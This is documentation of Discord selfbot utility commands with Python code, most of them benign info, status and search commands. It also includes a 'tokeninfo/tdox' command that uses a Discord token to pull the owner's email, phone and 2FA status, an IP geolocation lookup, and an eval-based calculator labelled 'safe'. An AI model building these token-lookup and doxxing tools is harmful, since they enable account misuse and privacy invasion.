# Utility Commands Documentation

Utility commands provide useful tools for information gathering, server management, and automation.

---

## Table of Contents

1. [Information Commands](#information-commands)
2. [User Information](#user-information)
3. [Server Information](#server-information)
4. [Role Management](#role-management)
5. [Channel Management](#channel-management)
6. [Message Utilities](#message-utilities)
7. [Status & Presence](#status--presence)
8. [Search Commands](#search-commands)
9. [Calculation & Conversion](#calculation--conversion)

---

## Information Commands

### `ping`

**Source**: All selfbots

Checks bot latency.

**Parameters**: None

**Implementation**:
```python
async def ping(ctx):
    await ctx.message.delete()
    
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    latency = (time.monotonic() - before) * 1000
    
    await message.edit(content=f"`{int(latency)} ms`")
```

---

### `uptime`

**Source**: Alucard, selfbot.py

Shows how long the bot has been running.

**Implementation**:
```python
import datetime

start_time = datetime.datetime.utcnow()

async def uptime(ctx):
    await ctx.message.delete()
    
    now = datetime.datetime.utcnow()
    delta = now - start_time
    
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    
    uptime_str = f"**{days}** days, **{hours}** hours, **{minutes}** minutes, **{seconds}** seconds"
    await ctx.send(f"Uptime: {uptime_str}")
```

---

### `stats` / `botinfo`

**Source**: SharpBot, selfbot.py

Shows bot statistics.

**Implementation**:
```python
async def stats(ctx):
    await ctx.message.delete()
    
    embed = discord.Embed(title="Bot Statistics", color=discord.Color.blue())
    embed.add_field(name="Servers", value=len(ctx.bot.guilds))
    embed.add_field(name="Users", value=len(set(ctx.bot.get_all_members())))
    embed.add_field(name="Channels", value=len(set(ctx.bot.get_all_channels())))
    embed.add_field(name="Commands", value=len(ctx.bot.commands))
    embed.add_field(name="RAM Usage", value=f"{psutil.Process().memory_info().rss / 1024 ** 2:.2f} MB")
    embed.add_field(name="CPU Usage", value=f"{psutil.cpu_percent()}%")
    
    await ctx.send(embed=embed)
```

---

## User Information

### `whois` / `userinfo` / `ui`

**Source**: Alucard, selfbot.py, Exeter

Shows detailed user information.

**Parameters**:
- `user` (discord.Member, optional): Target user (defaults to self)

**Implementation**:
```python
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    
    if user is None:
        user = ctx.author
    
    date_format = "%a, %d %b %Y %I:%M %p"
    
    embed = discord.Embed(description=user.mention)
    embed.set_author(name=str(user), icon_url=user.avatar.url if user.avatar else user.default_avatar.url)
    embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)
    
    embed.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    embed.add_field(name="Join Position", value=str(members.index(user) + 1))
    
    embed.add_field(name="Registered", value=user.created_at.strftime(date_format))
    
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        embed.add_field(name=f"Roles [{len(user.roles)-1}]", value=role_string, inline=False)
    
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() 
                             for p in user.guild_permissions if p[1]])
    embed.add_field(name="Guild Permissions", value=perm_string, inline=False)
    embed.set_footer(text=f'ID: {user.id}')
    
    await ctx.send(embed=embed)
```

---

### `avatar` / `av` / `pfp`

**Source**: Alucard, Exeter, SharpBot

Gets user avatar.

**Parameters**:
- `user` (discord.Member, optional): Target user

**Implementation**:
```python
async def avatar(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    
    if user is None:
        user = ctx.author
    
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
    
    embed = discord.Embed(title=f"{user.name}'s Avatar")
    embed.set_image(url=avatar_url)
    
    await ctx.send(embed=embed)
```

---

### `tokeninfo` / `tdox`

**Source**: Alucard, selfbot.py

Gets information from a Discord token.

**Parameters**:
- `token` (str): Discord token to check

**Implementation**:
```python
async def tokeninfo(ctx, token: str):
    await ctx.message.delete()
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        res = res.json()
        
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        
        # Calculate creation date from snowflake
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) / 1000
        ).strftime('%d-%m-%Y %H:%M:%S UTC')
        
        # Get language name
        languages = {
            'da': 'Danish', 'de': 'German', 'en-GB': 'English (UK)',
            'en-US': 'English (US)', 'es-ES': 'Spanish', 'fr': 'French',
            # ... more languages
        }
        
        embed = discord.Embed(title="Token Information")
        embed.add_field(name="Username", value=f"{res['username']}#{res['discriminator']}")
        embed.add_field(name="ID", value=user_id)
        embed.add_field(name="Email", value=res.get('email', 'N/A'))
        embed.add_field(name="Phone", value=res.get('phone', 'N/A'))
        embed.add_field(name="2FA Enabled", value=res.get('mfa_enabled', False))
        embed.add_field(name="Verified", value=res.get('verified', False))
        embed.add_field(name="Locale", value=f"{locale} ({languages.get(locale, 'Unknown')})")
        embed.add_field(name="Creation Date", value=creation_date)
        
        if avatar_id:
            embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
        
        await ctx.send(embed=embed)
        
    except:
        await ctx.send("Invalid token")
```

---

## Server Information

### `serverinfo` / `guildinfo` / `si`

**Source**: Alucard, selfbot.py, SharpBot

Shows server information.

**Parameters**:
- `guild_id` (int, optional): Server ID (for checking other servers)

**Implementation**:
```python
async def serverinfo(ctx, guild_id: int = None):
    await ctx.message.delete()
    
    if guild_id:
        guild = ctx.bot.get_guild(guild_id)
    else:
        guild = ctx.guild
    
    if not guild:
        return await ctx.send("Guild not found")
    
    date_format = "%a, %d %b %Y %I:%M %p"
    
    embed = discord.Embed(title=guild.name)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    
    # Owner info
    embed.add_field(name="Owner", value=guild.owner, inline=True)
    embed.add_field(name="ID", value=guild.id, inline=True)
    embed.add_field(name="Creation Date", value=guild.created_at.strftime(date_format))
    
    # Member counts
    online = sum(1 for m in guild.members if m.status != discord.Status.offline)
    embed.add_field(name="Members", value=f"{online}/{guild.member_count}")
    
    # Channel counts
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    categories = len(guild.categories)
    embed.add_field(name="Channels", value=f"{text_channels} text / {voice_channels} voice / {categories} categories")
    
    # Other stats
    embed.add_field(name="Roles", value=len(guild.roles))
    embed.add_field(name="Emojis", value=len(guild.emojis))
    embed.add_field(name="Region", value=str(guild.region))
    embed.add_field(name="Verification", value=str(guild.verification_level))
    
    if guild.banner:
        embed.set_image(url=guild.banner.url)
    
    await ctx.send(embed=embed)
```

---

### `guildicon` / `servericon`

**Source**: selfbot.py

Shows server icon.

**Implementation**:
```python
async def guildicon(ctx):
    await ctx.message.delete()
    
    if not ctx.guild.icon:
        return await ctx.send("This server has no icon")
    
    await ctx.send(ctx.guild.icon.url)
```

---

### `guildbanner`

**Source**: selfbot.py

Shows server banner.

**Implementation**:
```python
async def guildbanner(ctx):
    await ctx.message.delete()
    
    if not ctx.guild.banner:
        return await ctx.send("This server has no banner")
    
    await ctx.send(ctx.guild.banner.url)
```

---

## Role Management

### `roleinfo` / `ri`

**Source**: Alucard, selfbot.py

Shows role information.

**Parameters**:
- `role` (discord.Role): Role to check

**Implementation**:
```python
async def roleinfo(ctx, *, role: discord.Role):
    await ctx.message.delete()
    
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = f"{role_created} ({since_created} days ago)"
    
    users = len([x for x in ctx.guild.members if role in x.roles])
    
    embed = discord.Embed(colour=role.colour)
    embed.set_author(name=role.name)
    embed.add_field(name="ID", value=role.id)
    embed.add_field(name="Users", value=users)
    embed.add_field(name="Mentionable", value=role.mentionable)
    embed.add_field(name="Hoist", value=role.hoist)
    embed.add_field(name="Position", value=role.position)
    embed.add_field(name="Managed", value=role.managed)
    embed.add_field(name="Color", value=str(role.colour))
    embed.add_field(name="Created", value=created_on)
    
    await ctx.send(embed=embed)
```

---

### `listroles`

**Source**: SharpBot

Lists all roles in the server.

**Implementation**:
```python
async def listroles(ctx):
    await ctx.message.delete()
    
    roles = sorted(ctx.guild.roles, key=lambda r: r.position, reverse=True)
    role_list = [f"{r.position}: {r.name} ({len(r.members)} members)" for r in roles]
    
    await ctx.send(f"```{chr(10).join(role_list)}```")
```

---

## Channel Management

### `channelinfo` / `ci`

**Source**: Discord-Selfbot

Shows channel information.

**Implementation**:
```python
async def channelinfo(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    
    if channel is None:
        channel = ctx.channel
    
    embed = discord.Embed(title=f"#{channel.name}")
    embed.add_field(name="ID", value=channel.id)
    embed.add_field(name="Category", value=channel.category.name if channel.category else "None")
    embed.add_field(name="Position", value=channel.position)
    embed.add_field(name="NSFW", value=channel.is_nsfw())
    embed.add_field(name="Created", value=channel.created_at.strftime("%Y-%m-%d"))
    
    await ctx.send(embed=embed)
```

---

### `channels` / `listchannels`

**Source**: selfbot.py

Lists all channels in the server.

**Implementation**:
```python
async def channels(ctx):
    await ctx.message.delete()
    
    text = [f"📝 {c.name}" for c in ctx.guild.text_channels]
    voice = [f"🔊 {c.name}" for c in ctx.guild.voice_channels]
    categories = [f"📚 {c.name}" for c in ctx.guild.categories]
    
    all_channels = categories + [""] + text + [""] + voice
    
    await ctx.send(f"```{chr(10).join(all_channels)}```")
```

---

## Message Utilities

### `purge` / `clear` / `prune`

**Source**: All selfbots

Deletes messages.

**Parameters**:
- `limit` (int): Number of messages to delete
- `member` (discord.Member, optional): Only delete from this member

**Implementation**:
```python
async def purge(ctx, limit: int, member: discord.Member = None):
    await ctx.message.delete()
    
    if member:
        # Delete specific member's messages
        deleted = 0
        async for message in ctx.channel.history(limit=limit * 2):
            if message.author == member:
                await message.delete()
                deleted += 1
                if deleted >= limit:
                    break
                await asyncio.sleep(0.5)
    else:
        # Delete all messages
        await ctx.channel.purge(limit=limit)
```

---

### `firstmessage` / `firstmsg`

**Source**: Alucard, selfbot.py

Gets link to first message in channel.

**Implementation**:
```python
async def firstmessage(ctx):
    await ctx.message.delete()
    
    async for message in ctx.channel.history(limit=1, oldest_first=True):
        link = f"https://discord.com/channels/{ctx.guild.id}/{ctx.channel.id}/{message.id}"
        await ctx.send(f"First message: {link}")
        break
```

---

### `quote` / `q`

**Source**: Discord-Selfbot, SharpBot

Quotes a message.

**Parameters**:
- `message_id` (int): Message ID to quote
- `channel` (discord.TextChannel, optional): Channel to search

**Implementation**:
```python
async def quote(ctx, message_id: int, channel: discord.TextChannel = None):
    await ctx.message.delete()
    
    if channel is None:
        channel = ctx.channel
    
    try:
        message = await channel.fetch_message(message_id)
        
        embed = discord.Embed(
            description=message.content,
            timestamp=message.created_at,
            color=discord.Color.blue()
        )
        embed.set_author(
            name=message.author.name,
            icon_url=message.author.avatar.url if message.author.avatar else None
        )
        embed.set_footer(text=f"#{channel.name}")
        
        if message.attachments:
            embed.set_image(url=message.attachments[0].url)
        
        await ctx.send(embed=embed)
        
    except discord.NotFound:
        await ctx.send("Message not found")
```

---

### `cleardm` / `cleardms`

**Source**: selfbot.py

Deletes your messages in DMs.

**Parameters**:
- `amount` (int): Number of messages to delete

**Implementation**:
```python
async def cleardm(ctx, amount: int = 10):
    await ctx.message.delete()
    
    if not isinstance(ctx.channel, discord.DMChannel):
        return await ctx.send("This command only works in DMs")
    
    if amount > 100:
        return await ctx.send("Maximum 100 messages")
    
    deleted = 0
    async for message in ctx.channel.history(limit=amount):
        if message.author == ctx.bot.user:
            await message.delete()
            deleted += 1
            await asyncio.sleep(0.5)
    
    await ctx.send(f"Deleted {deleted} messages", delete_after=3)
```

---

## Status & Presence

### `playing` / `game`

**Source**: Alucard, selfbot.py

Sets playing status.

**Parameters**:
- `status` (str): Game name

**Implementation**:
```python
async def playing(ctx, *, status: str):
    await ctx.message.delete()
    await ctx.bot.change_presence(activity=discord.Game(name=status))
    await ctx.send(f"Set game status to `{status}`", delete_after=3)
```

---

### `streaming` / `stream`

**Source**: Alucard, selfbot.py

Sets streaming status.

**Parameters**:
- `status` (str): Stream title
- `url` (str, optional): Twitch URL

**Implementation**:
```python
async def streaming(ctx, *, status: str):
    await ctx.message.delete()
    await ctx.bot.change_presence(
        activity=discord.Streaming(
            name=status,
            url=f"https://www.twitch.tv/{status.replace(' ', '_')}"
        )
    )
```

---

### `listening`

**Source**: Alucard Selfbot

Sets listening status.

**Implementation**:
```python
async def listening(ctx, *, status: str):
    await ctx.message.delete()
    await ctx.bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=status
        )
    )
```

---

### `watching`

**Source**: Alucard, selfbot.py

Sets watching status.

**Implementation**:
```python
async def watching(ctx, *, status: str):
    await ctx.message.delete()
    await ctx.bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=status
        )
    )
```

---

### `stopactivity` / `clearstatus`

**Source**: selfbot.py

Clears status.

**Implementation**:
```python
async def stopactivity(ctx):
    await ctx.message.delete()
    await ctx.bot.change_presence(activity=None)
```

---

## Search Commands

### `google` / `g`

**Source**: Discord-Selfbot, SharpBot

Searches Google.

**Parameters**:
- `query` (str): Search query

**Implementation**:
```python
async def google(ctx, *, query: str):
    await ctx.message.delete()
    
    search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"
    
    await ctx.send(f"Search results for `{query}`: <{search_url}>")
```

---

### `youtube` / `yt`

**Source**: selfbot.py, SharpBot

Searches YouTube.

**Implementation**:
```python
async def youtube(ctx, *, search: str):
    await ctx.message.delete()
    
    query = urllib.parse.quote_plus(search)
    url = f"https://www.youtube.com/results?search_query={query}"
    
    # Scrape for first result
    response = requests.get(url).text
    soup = BeautifulSoup(response, 'html.parser')
    
    # Find first video
    for vid in soup.find_all(attrs={'class': 'yt-uix-tile-link'}):
        if vid.get('href').startswith('/watch'):
            video_url = f"https://youtube.com{vid.get('href')}"
            await ctx.send(f"Top result for `{search}`: {video_url}")
            return
    
    await ctx.send("No results found")
```

---

### `urban` / `ud`

**Source**: selfbot.py, SharpBot

Searches Urban Dictionary.

**Parameters**:
- `term` (str): Search term

**Implementation**:
```python
async def urban(ctx, *, term: str):
    await ctx.message.delete()
    
    url = f"https://www.urbandictionary.com/define.php?term={urllib.parse.quote_plus(term)}"
    
    # Could use API for better results
    await ctx.send(f"Urban Dictionary definition of `{term}`: <{url}>")
```

---

### `wiki` / `wikipedia`

**Source**: selfbot.py

Searches Wikipedia.

**Implementation**:
```python
async def wiki(ctx, *, query: str):
    await ctx.message.delete()
    
    try:
        import wikipedia
        result = wikipedia.summary(query, sentences=3)
        page = wikipedia.page(query)
        
        embed = discord.Embed(title=page.title, description=result)
        embed.set_footer(text=f"Source: {page.url}")
        await ctx.send(embed=embed)
        
    except:
        await ctx.send("No results found")
```

---

## Calculation & Conversion

### `calc` / `calculate` / `math`

**Source**: SharpBot, selfbot.py

Calculates mathematical expressions.

**Parameters**:
- `expression` (str): Math expression

**Implementation**:
```python
async def calc(ctx, *, expression: str):
    await ctx.message.delete()
    
    try:
        # Safe eval with limited operations
        allowed = {
            'sqrt': math.sqrt, 'pow': math.pow,
            'sin': math.sin, 'cos': math.cos, 'tan': math.tan,
            'pi': math.pi, 'e': math.e
        }
        
        result = eval(expression, {"__builtins__": {}}, allowed)
        await ctx.send(f"`{expression} = {result}`")
        
    except Exception as e:
        await ctx.send(f"Error: {e}")
```

---

### `geoip` / `ip` / `geo`

**Source**: Alucard, selfbot.py

Looks up IP geolocation.

**Parameters**:
- `ip` (str): IP address

**Implementation**:
```python
async def geoip(ctx, ip: str):
    await ctx.message.delete()
    
    r = requests.get(f'http://ip-api.com/json/{ip}')
    data = r.json()
    
    if data['status'] == 'success':
        embed = discord.Embed(title=f"IP: {data['query']}")
        embed.add_field(name="Country", value=f"{data['country']} ({data['countryCode']})")
        embed.add_field(name="Region", value=data['regionName'])
        embed.add_field(name="City", value=data['city'])
        embed.add_field(name="ZIP", value=data['zip'])
        embed.add_field(name="Lat/Lon", value=f"{data['lat']}, {data['lon']}")
        embed.add_field(name="ISP", value=data['isp'])
        embed.add_field(name="Org", value=data['org'])
        embed.add_field(name="Timezone", value=data['timezone'])
        
        await ctx.send(embed=embed)
    else:
        await ctx.send("Could not geolocate IP")
```

---

### `weather`

**Source**: Alucard, SharpBot

Gets weather information.

**Parameters**:
- `city` (str): City name

**Implementation**:
```python
async def weather(ctx, *, city: str):
    await ctx.message.delete()
    
    api_key = config.get('weather_key')
    if not api_key:
        return await ctx.send("Weather API key not configured")
    
    url = f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}'
    r = requests.get(url)
    data = r.json()
    
    if data.get('main'):
        temp = round(data['main']['temp'] - 273.15, 1)
        feels_like = round(data['main']['feels_like'] - 273.15, 1)
        humidity = data['main']['humidity']
        weather = data['weather'][0]['main']
        
        embed = discord.Embed(title=f"Weather in {city}")
        embed.add_field(name="Temperature", value=f"{temp}°C")
        embed.add_field(name="Feels Like", value=f"{feels_like}°C")
        embed.add_field(name="Humidity", value=f"{humidity}%")
        embed.add_field(name="Condition", value=weather)
        
        await ctx.send(embed=embed)
    else:
        await ctx.send("City not found")
```

---

### `btc` / `bitcoin`

**Source**: Alucard Selfbot

Gets Bitcoin price.

**Implementation**:
```python
async def btc(ctx):
    await ctx.message.delete()
    
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    data = r.json()
    
    embed = discord.Embed(title="Bitcoin Price")
    embed.add_field(name="USD", value=f"${data['USD']}")
    embed.add_field(name="EUR", value=f"€{data['EUR']}")
    
    await ctx.send(embed=embed)
```

---

## References

- **Alucard**: User/server info commands
- **SharpBot**: Utility and search commands
- **selfbot.py**: Information and status commands
- **Discord-Selfbot**: Purge and quote commands
